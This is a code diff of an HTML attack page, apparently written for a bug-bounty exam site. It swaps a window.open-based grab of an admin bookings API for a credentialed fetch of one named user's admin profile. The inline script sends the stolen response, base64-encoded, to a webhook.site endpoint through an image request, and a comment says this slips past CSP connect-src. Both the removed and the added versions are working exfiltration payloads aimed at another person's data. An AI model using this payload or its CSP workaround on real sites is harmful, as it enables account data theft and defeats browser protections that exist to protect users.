@@ -3,20 +3,17 @@
 <body>
     <script>
         const webh = "https://webhook.site/91bce232-92d8-4ee3-bf77-38a155638aae";
-        const target = "https://api-bugbounty-exam.hashacademy.co/api/admin/bookings";
-
-        // Open the API in a hidden way and leak the content
-        const win = window.open(target, "_blank");
+        const elenaId = "69d29dc2d8e73faab806acf3"; // ID from your previous exfiltration
         
-        setTimeout(() => {
-            try {
-                const data = win.document.body.innerText;
-                window.location.href = webh + "?d=" + btoa(data);
-            } catch (e) {
-                // If window.open is blocked, try a direct link redirect
-                window.location.href = target; 
-            }
-        }, 2000);
+        // Target Elena's specific admin-view profile
+        fetch(`https://api-bugbounty-exam.hashacademy.co/api/admin/users/${elenaId}`, { 
+            credentials: "include" 
+        })
+        .then(r => r.text())
+        .then(data => {
+            // Leak it via image source to bypass CSP connect-src
+            new Image().src = `${webh}/elena_leak.png?d=${btoa(data)}`;
+        });
     </script>
 </body>
 </html>
